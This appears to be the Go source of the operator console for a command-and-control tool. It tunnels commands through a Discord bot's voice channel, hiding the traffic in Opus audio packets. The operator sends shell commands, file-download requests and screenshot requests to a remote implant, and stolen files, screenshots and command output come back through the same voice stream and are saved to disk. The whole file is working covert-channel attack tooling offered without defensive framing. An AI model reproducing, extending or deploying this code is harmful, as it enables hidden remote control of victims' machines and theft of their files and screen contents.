package main

import (
	"bufio"
	"bytes"
	"fmt"
	"github.com/bwmarrin/discordgo"
	"os"
	"strings"
)

var (
	Token     = "" //Bot Token
	ChannelID = "" //Voice Channel ID
	GuildID   = "" //Server ID

	buffer         = make([][]byte, 0)
	buffer_new     = make([][]byte, 0)
	info           string
	delimiter_data = "|||"
	chunks         = make([][]byte, 0)
	tmp            = make([][]byte, 0)
	prompt         = "cmd> "
	cmd            string
)

func handleVoice(c chan *discordgo.Packet) {
	for p := range c {
		data := strings.Split(string(p.Opus), "|||")
		raw_data := data[1]
		if data[0] == "Run-Command" {
			fmt.Println("\n" + raw_data)
			fmt.Print(prompt)
		} else if data[0] == "Download" {
			f, _ := os.OpenFile(raw_data, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
			f.WriteString(data[2])
			f.Close()
			fmt.Print(".")
		} else if data[0] == "Screenshot" {
			f, _ := os.OpenFile(raw_data, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
			f.WriteString(data[2])
			f.Close()
			fmt.Print(".")
		}
	}
}

func playSound(s *discordgo.VoiceConnection, mode string) {
	s.Speaking(true)
	i := 0
	for _, h := range chunks {
		//hacky way to get cmd data from buffer
		tmp = append(tmp, h)
		for _, chunk := range tmp {
			i++
			size := [][]byte{[]byte((mode + delimiter_data))}
			size_new := bytes.Join(size, nil)
			size_chunk := chunk_buffer(size_new, 990)
			new_chunk := append(size_chunk, chunk)
			a := bytes.Join(new_chunk, nil)
			s.OpusSend <- a
			tmp = make([][]byte, 0)
		}
	}
	s.Speaking(false)
}

func chunk_buffer(buf []byte, lim int) [][]byte {
	var chunk []byte
	chunks := make([][]byte, 0, len(buf)/lim+1)
	for len(buf) >= lim {
		chunk, buf = buf[:lim], buf[lim:]
		chunks = append(chunks, chunk)
	}
	if len(buf) > 0 {
		chunks = append(chunks, buf[:len(buf)])
	}
	return chunks
}

func main() {
	//auth bot
	s, err := discordgo.New("Bot " + Token)
	if err != nil {
		fmt.Println("error creating Discord session:", err)
		return
	}
	defer s.Close()

	//create intents
	s.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMessages | discordgo.IntentsGuildVoiceStates
	err = s.Open()
	if err != nil {
		fmt.Println("error opening connection:", err)
		return
	}

	//join c2 channel voice chat
	v, err := s.ChannelVoiceJoin(GuildID, ChannelID, true, false)
	if err != nil {
		fmt.Println("failed to join voice channel:", err)
		return
	}

	//handle incoming data
	go handleVoice(v.OpusRecv)
	fmt.Println("[+] Listening...\n")

	fmt.Print(prompt)

	for {
		var cmd string
		scanner := bufio.NewScanner(os.Stdin)
		if scanner.Scan() {
			cmd = scanner.Text()
		}

		if cmd == "" {
			fmt.Print(prompt)
			scanner := bufio.NewScanner(os.Stdin)
			if scanner.Scan() {
				cmd = scanner.Text()
			}
		} else if cmd == "download" {
			prompt = "download file path>"
			fmt.Print(prompt)
			scanner := bufio.NewScanner(os.Stdin)
			if scanner.Scan() {
				cmd = scanner.Text()
			}
			go func() {
				buffer = append(buffer, []byte(cmd))
				result := bytes.Join(buffer, nil)
				chunks = chunk_buffer(result, 990)
				playSound(v, "Download")
				buffer = make([][]byte, 0)
			}()
			prompt = "cmd>"
		} else if cmd == "screenshot" {
			prompt = "screenshotting..."
			fmt.Print(prompt)
			go func() {
				buffer = append(buffer, []byte(cmd))
				result := bytes.Join(buffer, nil)
				chunks = chunk_buffer(result, 990)
				playSound(v, "Screenshot")
				buffer = make([][]byte, 0)
			}()
			prompt = "cmd>"
		} else {
			go func() {
				buffer = append(buffer, []byte(cmd))
				result := bytes.Join(buffer, nil)
				chunks = chunk_buffer(result, 990)
				playSound(v, "Run-Command")
				buffer = make([][]byte, 0)
			}()
		}
	}
}
